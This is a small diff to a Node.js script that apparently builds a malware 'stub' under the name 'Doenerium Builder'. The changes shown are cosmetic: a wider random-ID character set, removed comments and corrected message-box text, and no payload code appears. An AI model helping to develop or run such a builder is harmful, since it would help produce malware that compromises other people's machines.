@@ -5,7 +5,7 @@ const exec = promisify(require('child_process').exec);
 
 async function makeid_var(length) {
     let result = '';
-    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    const characters = 'abcdefghijklmnopqrstuvwxyz1234567890';
     const charactersLength = characters.length;
     let counter = 0;
     while (counter < length) {
@@ -16,11 +16,11 @@ async function makeid_var(length) {
 }
 
 function notifySuccess(message) {
-    console.log('\x1b[32m%s\x1b[0m', message); // Green text
+    console.log('\x1b[32m%s\x1b[0m', message);
 }
 
 function notifyError(message) {
-    console.error('\x1b[31m%s\x1b[0m', message); // Red text
+    console.error('\x1b[31m%s\x1b[0m', message);
 }
 
 async function main() {
@@ -66,7 +66,7 @@ async function main() {
             await fs.rename(oldFilePath, newFilePath);
 
             notifySuccess(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
-            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}', 'Doenerium Builer', 'OK', 'Information')"`);
+            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}', 'Doenerium Builder', 'OK', 'Information')"`);
             await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
             
         }
